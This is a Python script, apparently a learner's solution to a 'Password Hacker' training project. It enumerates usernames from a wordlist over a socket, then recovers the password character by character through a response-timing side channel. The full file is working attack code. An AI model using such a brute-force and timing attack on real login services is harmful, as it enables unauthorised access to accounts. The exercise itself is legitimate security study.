import json
import socket
import sys
import time


def file_line_iterator(filename):
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


host, port = sys.argv[1:]
address = (host, int(port))

try:
    with socket.socket() as sock:
        sock.connect(address)
        login_list = file_line_iterator("/Users/akshitmehta/PycharmProjects/"
                                        "Password Hacker with Python/Password Hacker with Python/"
                                        "task/hacking/Step.txt")
        found = False

        try:
            username = ''
            response_time = 0
            for login in login_list:
                credentials = json.dumps({"login": login, "password": "asoiaf"})
                start = time.time()
                sock.send(credentials.encode())
                response = json.loads(sock.recv(1024).decode())
                end = time.time()
                response_time = end - start
                if response["result"] == "Wrong password!":
                    username = login
                    break

            password = ''
            while True:
                found = False
                for ascii_code in range(128):
                    passw = password + chr(ascii_code)
                    credentials = json.dumps({"login": username, "password": passw})
                    start = time.time()
                    sock.send(credentials.encode())
                    response = json.loads(sock.recv(1024).decode())
                    end = time.time()
                    response_time_guess = end - start
                    if response_time_guess > response_time:
                        password += chr(ascii_code)
                        response_time = response_time_guess
                        break
                    elif response["result"] == "Connection success!":
                        password += chr(ascii_code)
                        found = True
                        break
                if found:
                    break

            if found:
                credentials = {"login": username, "password": password}
                print(json.dumps(credentials))
            else:
                print('Too many attempts or incorrect host/port.')

        except StopIteration:
            pass

except Exception as e:
    print(f"An error occurred: {e}")